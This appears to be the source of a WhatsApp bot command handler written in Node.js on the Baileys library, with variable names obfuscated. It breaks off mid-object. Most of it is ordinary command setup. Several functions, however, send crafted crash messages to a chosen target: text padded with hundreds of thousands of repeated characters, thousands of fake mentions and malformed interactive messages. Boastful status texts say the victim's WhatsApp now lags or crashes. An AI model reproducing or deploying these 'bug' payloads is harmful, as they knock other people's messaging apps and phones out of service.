require("./setting");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const fs3 = require("fs");
const util2 = require("util");
const chalk2 = require("chalk");
const os2 = require("os");
const axios2 = require("axios");
const pino2 = require("pino");
const fsExtra = require("fs-extra");
const crypto2 = require("crypto");
const fluentFfmpeg = require("fluent-ffmpeg");
const momentTimezone = require("moment-timezone");
const {
  JSDOM
} = require("jsdom");
const awesomePhonenumber = require("awesome-phonenumber");
const {
  color,
  bgcolor
} = require("./lib/color");
const {
  uptotelegra
} = require("./lib/upload");
const {
  Primbon
} = require("scrape-primbon");
const v612 = new Primbon();
const {
  remini
} = require("./database/remini");
const hxzApi = require("hxz-api");
const ytdlCore = require("ytdl-core");
const {
  Configuration,
  OpenAIApi
} = require("openai");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  smsg,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins
} = require("./lib/myfunc");
const {
  FajarNews,
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme,
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api");
const {
  isSetBot,
  addSetBot,
  removeSetBot,
  changeSetBot,
  getTextSetBot,
  updateResponList,
  delResponList,
  renameList,
  isAlreadyResponListGroup,
  sendResponList,
  isAlreadyResponList,
  getDataResponList,
  addResponList,
  isSetClose,
  addSetClose,
  removeSetClose,
  changeSetClose,
  getTextSetClose,
  isSetDone,
  addSetDone,
  removeSetDone,
  changeSetDone,
  getTextSetDone,
  isSetLeft,
  addSetLeft,
  removeSetLeft,
  changeSetLeft,
  getTextSetLeft,
  isSetOpen,
  addSetOpen,
  removeSetOpen,
  changeSetOpen,
  getTextSetOpen,
  isSetProses,
  addSetProses,
  removeSetProses,
  changeSetProses,
  getTextSetProses,
  isSetWelcome,
  addSetWelcome,
  removeSetWelcome,
  changeSetWelcome,
  getTextSetWelcome,
  addSewaGroup,
  getSewaExpired,
  getSewaPosition,
  expiredCheck,
  checkSewaGroup,
  addPay,
  updatePay
} = require("./lib/store");
function f14(_0x39bf94) {
  temp = _0x39bf94;
  days = Math.floor(_0x39bf94 / 86400000);
  daysms = _0x39bf94 % 86400000;
  hours = Math.floor(daysms / 3600000);
  hoursms = _0x39bf94 % 3600000;
  minutes = Math.floor(hoursms / 60000);
  minutesms = _0x39bf94 % 60000;
  sec = Math.floor(minutesms / 1000);
  return days + " Days " + hours + " Hours " + minutes + " Minutes";
}
const vF6 = _0x10d2ea => {
  myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
  myDays = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum’at", "Sabtu"];
  var _0x55ec0f = new Date(_0x10d2ea);
  var _0x467305 = _0x55ec0f.getDate();
  bulan = _0x55ec0f.getMonth();
  var _0x4932ae = _0x55ec0f.getDay();
  var _0x4932ae = myDays[_0x4932ae];
  var _0x1963e9 = _0x55ec0f.getYear();
  var _0x36b409 = _0x1963e9 < 1000 ? _0x1963e9 + 1900 : _0x1963e9;
  const _0x36d6a0 = momentTimezone.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
  let _0x11584c = new Date();
  let _0x369d9d = "id";
  let _0x2c069a = new Date(0).getTime() - new Date("1 January 1970").getTime();
  let _0x239b08 = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((_0x11584c * 1 + _0x2c069a) / 84600000) % 5];
  return _0x4932ae + ", " + _0x467305 + " - " + myMonths[bulan] + " - " + _0x36b409;
};
module.exports = Zanss = async (_0x221ba4, _0x4611fa, _0x19d7a3, _0x89e459, _0x510a2, _0x5587e7, _0x525e38, _0x7790b4, _0x3a5119, _0x18c573, _0x186afc, _0x365e9f, _0x3186c3, _0x4bebbb, _0x884da1, _0x5e0e7e, _0x3f1490, _0xd412dc, _0x3abb3f, _0x29b7cc) => {
  try {
    var _0x5bfa4d = _0x4611fa.mtype === "conversation" ? _0x4611fa.message.conversation : _0x4611fa.mtype == "imageMessage" ? _0x4611fa.message.imageMessage.caption : _0x4611fa.mtype == "videoMessage" ? _0x4611fa.message.videoMessage.caption : _0x4611fa.mtype == "extendedTextMessage" ? _0x4611fa.message.extendedTextMessage.text : _0x4611fa.mtype == "buttonsResponseMessage" ? _0x4611fa.message.buttonsResponseMessage.selectedButtonId : _0x4611fa.mtype == "listResponseMessage" ? _0x4611fa.message.listResponseMessage.singleSelectReply.selectedRowId : _0x4611fa.mtype == "templateButtonReplyMessage" ? _0x4611fa.message.templateButtonReplyMessage.selectedId : _0x4611fa.mtype == "interactiveResponseMessage" ? JSON.parse(_0x4611fa.msg.nativeFlowResponseMessage.paramsJson).id : _0x4611fa.mtype == "templateButtonReplyMessage" ? _0x4611fa.msg.selectedId : _0x4611fa.mtype === "messageContextInfo" ? _0x4611fa.message.buttonsResponseMessage?.selectedButtonId || _0x4611fa.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x4611fa.text : "";
    var _0x24e006 = typeof _0x4611fa.text == "string" ? _0x4611fa.text : "";
    const _0x137417 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x5bfa4d) ? _0x5bfa4d.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : "";
    const _0x40ee63 = (_0xde45bd, _0x46f3dd = 1) => {
      var _0x3efd0d = "abcdefghijklmnopqrstuvwxyz1234567890".split("");
      var _0x58a912 = {
        "1": "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890"
      };
      var _0x2ba1a8 = [];
      _0x3efd0d.map((_0x308e12, _0x119f99) => _0x2ba1a8.push({
        original: _0x308e12,
        convert: _0x58a912[_0x46f3dd].split("")[_0x119f99]
      }));
      var _0x340f2b = _0xde45bd.toLowerCase().split("");
      var _0x39f41a = [];
      _0x340f2b.map(_0x492685 => {
        const _0x1e7126 = _0x2ba1a8.find(_0x19e48b => _0x221ba4.original == _0x492685);
        if (_0x1e7126) {
          _0x39f41a.push(_0x1e7126.convert);
        } else {
          _0x39f41a.push(_0x492685);
        }
      });
      return _0x39f41a.join("");
    };
    const _0x36c11c = _0x4611fa.pushName || "No Name";
    function _0x37a913() {
      var _0x579730 = new Date();
      var _0x4a55eb = _0x579730.getDate();
      var _0x2c3472 = _0x579730.getMonth() + 1;
      var _0x24fdaf = _0x579730.getFullYear();
      var _0x5673e5 = _0x579730.getHours();
      var _0xb6cdf1 = _0x579730.getMinutes();
      var _0x1830a5 = _0x579730.getSeconds();
    }
    const _0x495ba4 = _0x5bfa4d.startsWith(_0x137417);
    const _0x53d4d1 = _0x495ba4 ? _0x5bfa4d.slice(_0x137417.length).trim().split(" ").shift().toLowerCase() : "";
    const _0x18d0e5 = _0x5bfa4d.trim().split(/ +/).slice(1);
    const _0x27d4a1 = await _0x221ba4.decodeJid(_0x221ba4.user.id);
    const _0x2db258 = [_0x27d4a1, ...global.owner].map(_0x242055 => _0x242055.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x4611fa.sender);
    const _0x3e94bb = q = _0x18d0e5.join(" ");
    const {
      type: _0x188e55,
      quotedMsg: _0x53b21f,
      mentioned: _0x1c24b8,
      now: _0x10f091,
      fromMe: _0x429769
    } = _0x4611fa;
    const _0x3af358 = _0x4611fa.quoted ? _0x4611fa.quoted : _0x4611fa;
    const _0x27f568 = (_0x3af358.msg || _0x3af358).mimetype || "";
    const _0x194cac = /image|video|sticker|audio/.test(_0x27f568);
    const _0x1dd769 = mek.key.remoteJid;
    const _0x2ec274 = _0x1dd769.endsWith("@g.us");
    const _0xc70d8c = _0x1dd769.endsWith("@s.whatsapp.net");
    const _0x228fe0 = _0x4611fa.isGroup ? _0x4611fa.key.participant ? _0x4611fa.key.participant : _0x4611fa.participant : _0x4611fa.key.remoteJid;
    const _0x2a4f6a = _0x228fe0.split("@")[0];
    const _0x44abad = _0x27d4a1.includes(_0x2a4f6a);
    const _0x381873 = _0x4611fa.isGroup ? await _0x221ba4.groupMetadata(_0x1dd769).catch(_0x1bcff7 => {}) : "";
    const _0x483cc8 = _0x4611fa.isGroup ? _0x381873.subject : "";
    const _0x264c7c = _0x4611fa.isGroup ? await _0x381873.participants : "";
    const _0x38a63d = _0x4611fa.isGroup ? await getGroupAdmins(_0x264c7c) : "";
    const _0x3c8260 = _0x4611fa.isGroup ? _0x38a63d.includes(_0x27d4a1) : false;
    const _0x13697b = _0x4611fa.isGroup ? _0x38a63d.includes(_0x4611fa.sender) : false;
    const _0xaf1ce6 = JSON.parse(fs3.readFileSync("./database/testimoni.json"));
    let _0x2cf937 = JSON.parse(fs3.readFileSync("./database/set_welcome.json"));
    let _0x33cb69 = JSON.parse(fs3.readFileSync("./database/set_left.json"));
    let _0x4fd0b8 = JSON.parse(fs3.readFileSync("./database/welcome.json"));
    let _0x257f16 = JSON.parse(fs3.readFileSync("./database/left.json"));
    let _0x583dfd = JSON.parse(fs3.readFileSync("./database/set_proses.json"));
    let _0x1ae4d0 = JSON.parse(fs3.readFileSync("./database/set_done.json"));
    let _0x465543 = JSON.parse(fs3.readFileSync("./database/set_open.json"));
    let _0x535722 = JSON.parse(fs3.readFileSync("./database/set_close.json"));
    let _0x484ef0 = JSON.parse(fs3.readFileSync("./database/sewa.json"));
    let _0x444d40 = JSON.parse(fs3.readFileSync("./database/pay.json"));
    let _0x550325 = JSON.parse(fs3.readFileSync("./database/opengc.json"));
    let _0x8a5657 = JSON.parse(fs3.readFileSync("./database/antilink.json"));
    let _0x1a6437 = JSON.parse(fs3.readFileSync("./database/antiwame.json"));
    let _0x5912c7 = JSON.parse(fs3.readFileSync("./database/antilink2.json"));
    let _0x569d96 = JSON.parse(fs3.readFileSync("./database/autojpm.json"));
    let _0x26ac42 = JSON.parse(fs3.readFileSync("./database/antiwame2.json"));
    let _0x53120f = JSON.parse(fs3.readFileSync("./database/list.json"));
    const _0x165e4a = JSON.parse(fs3.readFileSync("./database/premium.json"));
    const _0x157ab2 = JSON.parse(fs3.readFileSync("./database/partner.json"));
    const _0x37e54b = JSON.parse(fs3.readFileSync("./database/owner.json"));
    const _0x1d6b8e = JSON.parse(fs3.readFileSync("./database/unli.json"));
    const _0x475bb6 = fs3.readFileSync("./dareen/dareen_alberich.mp3");
    const _0x38d731 = JSON.parse(fs3.readFileSync("./database/dareen/contacts.json"));
    const _0xe8c598 = JSON.stringify(_0x4611fa.message);
    const _0x391104 = JSON.parse(fs3.readFileSync("./database/idgrup.json").toString());
    const _0x556b9c = _0x4611fa.isGroup ? _0x391104.includes(_0x4611fa.chat) : false;
    const _0x282a86 = _0x3e94bb.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const _0xc2c80f = _0x4611fa.mtype == "extendedTextMessage" && _0x4611fa.message.extendedTextMessage.contextInfo != null ? _0x4611fa.message.extendedTextMessage.contextInfo.mentionedJid : [];
    const _0x37405a = _0x38d731.includes(_0x228fe0);
    const _0x3f7a9a = _0x4fd0b8.includes(_0x4611fa.chat);
    const _0x129a67 = _0x257f16.includes(_0x4611fa.chat);
    const _0x2eafe1 = _0x8a5657.includes(_0x4611fa.chat) ? true : false;
    const _0x2ede3c = _0x5912c7.includes(_0x4611fa.chat) ? true : false;
    const _0x5325f0 = _0x569d96.includes(_0x4611fa.chat) ? true : false;
    const _0x428d53 = _0x165e4a.includes(_0x228fe0);
    const _0x4e5faa = _0x157ab2.includes(_0x228fe0);
    const _0x313f24 = _0x1d6b8e.includes(_0x4611fa.chat);
    const _0x1220c9 = _0x37e54b.includes(_0x2a4f6a) || _0x44abad;
    const _0x92c699 = _0x188e55 == "extendedTextMessage" && _0x4611fa.message.extendedTextMessage.contextInfo != null ? _0x4611fa.message.extendedTextMessage.contextInfo.participant || "" : "";
    const _0x59431e = momentTimezone(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
    const _0x4fb9ca = momentTimezone().tz("Asia/Kolkata").format("HH:mm:ss");
    if (_0x4fb9ca < "23:59:00") {
      var _0x73655f = _0x40ee63("Good Night");
    }
    if (_0x4fb9ca < "19:00:00") {
      var _0x73655f = _0x40ee63("Good Evening");
    }
    if (_0x4fb9ca < "18:00:00") {
      var _0x73655f = _0x40ee63("Good Evening");
    }
    if (_0x4fb9ca < "15:00:00") {
      var _0x73655f = _0x40ee63("Good Afternoon");
    }
    if (_0x4fb9ca < "11:00:00") {
      var _0x73655f = _0x40ee63("Good Morning");
    }
    if (_0x4fb9ca < "05:00:00") {
      var _0x73655f = _0x40ee63("Good Morning");
    }
    const _0x11be55 = momentTimezone(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    const _0x59d242 = momentTimezone.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const _0x4f09f3 = _0x4611fa.quoted ? "true" : "false";
    async function _0x19bfe9(_0x4d9e58, _0x4ffba4) {
      fs3.readFile(_0x4d9e58, "utf8", (_0x2e0ecb, _0x523634) => {
        if (_0x2e0ecb) {
          console.error("Terjadi kesalahan:", _0x2e0ecb);
          return;
        }
        const _0x559978 = new RegExp("case\\s+'" + _0x4ffba4 + "':[\\s\\S]*?break", "g");
        const _0xeb0ad6 = _0x523634.replace(_0x559978, "");
        fs3.writeFile(_0x4d9e58, _0xeb0ad6, "utf8", _0x31871e => {
          if (_0x31871e) {
            console.error("Terjadi kesalahan saat menulis file:", _0x31871e);
            return;
          }
          console.log("Teks dari case '" + _0x4ffba4 + "' telah dihapus dari file.");
        });
      });
    }
    const _0x3489fa = _0x2d3123 => {
      if (_0x2d3123.match("@")) {
        return [..._0x2d3123.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x448b0b => _0x448b0b[1] + "@s.whatsapp.net");
      } else {
        return [_0x228fe0];
      }
    };
    const _0x13a381 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x1dd769 ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x213101 = {
      text: _0x5bfa4d
    };
    const _0x27c46d = {
      extendedTextMessage: _0x213101
    };
    const _0x3c5e2f = {
      key: _0x13a381,
      message: _0x27c46d
    };
    const _0x568be6 = _0x3c5e2f;
    const _0x1d3510 = async _0xd92472 => _0x221ba4.sendMessage(_0x4611fa.chat, {
      text: _0xd92472,
      contextInfo: {
        mentionedJid: [_0x228fe0],
        forwardingScore: 9999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          containsAutoReply: true,
          title: "tzy",
          body: "Dáreen Albérich𓆰⸸𓆪",
          previewType: "PHOTO",
          thumbnailUrl: "https://www.youtube.com/@Dáreen Albérich𓆰⸸𓆪s",
          thumbnail: fs3.readFileSync("./dareen/Xynz.jpg"),
          sourceUrl: "https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U"
        }
      }
    }, {
      quoted: _0x4611fa
    });
    if (!_0x221ba4.public) {
      if (!_0x4611fa.key.fromMe) {
        return;
      }
    }
    let _0x4044d6 = ["recording"];
    let _0x4c7c95 = _0x4044d6[Math.floor(Math.random() * _0x4044d6.length)];
    if (_0x4611fa.message) {
      _0x221ba4.sendPresenceUpdate("available", _0x4611fa.chat);
      console.log("[1;31m~[1;37m>", "[[1;32m Dáreen Albérich𓆰⸸𓆪 [1;37m]", _0x59431e, chalk2.blue(_0x24e006 || _0x4611fa.mtype), "Dáreen Albérich𓆰⸸𓆪");
    }
    for (let _0x4f0ff3 of _0xaf1ce6) {
      if (_0x24e006 === _0x4f0ff3) {
        let _0x4c1647 = fs3.readFileSync("./database/dareen/" + _0x4f0ff3 + ".jpg");
        const _0x54a6ee = {
          image: _0x4c1647
        };
        _0x221ba4.sendMessage(_0x4611fa.chat, _0x54a6ee, {
          quoted: _0x4611fa
        });
      }
    }
    const {
      ios: _0xa2eb16
    } = require("./database/virtex/ios.js");
    const {
      telapreta3: _0x354985
    } = require("./database/virtex/telapreta3.js");
    const {
      convite: _0x50b890
    } = require("./database/virtex/convite.js");
    const {
      bugpdf: _0x25cbac
    } = require("./database/virtex/bugpdf.js");
    const {
      cP: _0x8b386a
    } = require("./database/virtex/bugUrl.js");
    const {
      beta1: _0x420cc8,
      beta2: _0x5a1026,
      buk1: _0x7eeee2
    } = require("./database/hdr.js");
    const _0x1800e6 = "『 *𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐁𝐔𝐆 𝐃𝐎𝐍𝐄 ⚠️* 』\n\n▣ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n▣ 𝐕𝐈𝐑𝐔𝐒  : 𝗕??𝗴 𝗗𝗲𝗹𝗮𝘆 𝗠??𝗸𝗲𝗿\n\n    𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug delay, target tidak bisa menggunakan whatsapp untuk menggunakan whatsapp untuk sementara waktu";
    const _0x3c3f2e = "『 *𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐁𝐔𝐆 𝐃𝐎𝐍𝐄 ⚠️* 』\n\n▣ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n▣ 𝐕𝐈𝐑𝐔𝐒  : 𝗕𝘂𝗴 𝗗𝗲𝗹𝗮𝘆 𝗠𝗮𝗸𝗲𝗿 & 𝗧𝗿𝗮𝘀𝗵 𝗨𝗜 𝗦𝘆𝘀𝘁𝗲𝗺\n\n    𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug delay dan virus ui, aplikasi whatsapp target tidak dapat digunakan sementara dikarenakan mengalami lemot, lag dan delay";
    const _0x279b19 = "『 *𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐁𝐔𝐆 𝐃𝐎𝐍𝐄 ⚠️* 』\n\n▣ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n▣ 𝐕𝐈𝐑𝐔𝐒  : 𝗧𝗿𝗮𝘀𝗵 𝗨𝗜 𝗦𝘆𝘀𝘁𝗲𝗺\n\n    𝐍𝐎𝐓𝐄\n𝘵𝘢𝘳𝘨𝘦𝘵 𝘮𝘦𝘯𝘨𝘢𝘭𝘢𝘮𝘪 𝘤𝘳𝘢𝘴𝘩 𝘱𝘢𝘥𝘢 𝘩𝘢𝘯𝘥𝘱𝘩𝘰𝘯𝘦 𝘯𝘺𝘢 𝘥𝘢𝘯 𝘸𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘯𝘺𝘢 𝘮𝘦𝘯𝘫𝘢𝘥𝘪 𝘥𝘦𝘭𝘢𝘺 𝘮𝘢𝘬𝘦𝘳, 𝘴𝘵𝘶𝘤𝘬 𝘪𝘯 𝘭𝘰𝘨𝘰 𝘸𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘴𝘦𝘣𝘢𝘣 𝘷𝘪𝘳𝘶𝘴 Dáreen Albérich𓆰⸸𓆪";
    const _0x42263d = _0x4611fa.mtype === "extendedTextMessage" && _0xe8c598.includes("viewOnceMessage");
    const _0xd1242f = _0x5053cf => {
      return _0x221ba4.sendMessage(_0x4611fa.chat, {
        react: {
          text: _0x5053cf,
          key: _0x4611fa.key
        }
      });
    };
    async function _0x2635a7(_0x3fe78b) {
      let _0x6c1c3b = "Dáreen Albérich𓆰⸸𓆪";
      await _0x221ba4.relayMessage(_0x3fe78b, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "Dáreen Albérich𓆰⸸𓆪" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️â̸̙͐͑̌̿͛̽y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x3fe78b
        }
      }, {
        messageId: null
      });
    }
    const _0x1de016 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Dáreen Albérich𓆰⸸𓆪",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    async function _0x11049b(_0x23a215) {
      let _0x4406b3 = "Hallo Crasher Datang" + "ꦾ".repeat(50000);
      let _0x4d9cf5 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      const _0x3ea8f7 = {
        title: " @120363326274964194@g.us",
        listType: "SINGLE_SELECT",
        singleSelectReply: {},
        description: " @120363326274964194@g.us",
        contextInfo: {}
      };
      _0x3ea8f7.singleSelectReply.selectedRowId = "Gateway To Hell";
      _0x3ea8f7.contextInfo.mentionedJid = _0x4d9cf5;
      _0x3ea8f7.contextInfo.groupMentions = [{
        groupJid: "120363326274964194@g.us",
        groupSubject: _0x4406b3
      }];
      const _0x1c0b37 = {
        listResponseMessage: _0x3ea8f7
      };
      const _0x5419ee = {
        message: _0x1c0b37
      };
      const _0x495af8 = {
        groupMentionedMessage: _0x5419ee
      };
      let _0x46a839 = _0x495af8;
      await _0x221ba4.relayMessage(_0x23a215, _0x46a839, {
        participant: {
          jid: _0x23a215
        }
      }, {
        messageId: null
      });
    }
    async function _0x452809(_0x26cd8c) {
      await _0x221ba4.relayMessage(_0x26cd8c, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐂𝐫𝐚𝐬𝐡 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 Dáreen Albérich𓆰⸸𓆪" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " Dáreen Albérich𓆰⸸𓆪 "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x26cd8c
        }
      }, {
        messageId: null
      });
    }
    async function _0x2d570b(_0x521ebd, _0x282469 = false) {
      await _0x221ba4.relayMessage(_0x521ebd, {
        extendedTextMessage: {
          text: "𝐌𝐀𝐌𝐏𝐔𝐒 𝐊𝐄𝐍𝐀 𝐔𝐈" + "ꦾ".repeat(45000),
          contextInfo: {
            mentionedJid: ["6282146497469@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "6282146497469@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: false,
                callOutcome: "5",
                durationSecs: "999",
                callType: "REGULAR",
                participants: [{
                  jid: "6282146497469@s.whatsapp.net",
                  callOutcome: "5"
                }]
              }
            },
            remoteJid: _0x521ebd,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 10,
            isForwarded: false,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: fs3.readFileSync("./dareen/alberich.jpg"),
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
              body: "Bug ui by @Dáreen Albérich𓆰⸸𓆪sdeveloper",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "x",
              mediaUrl: "x",
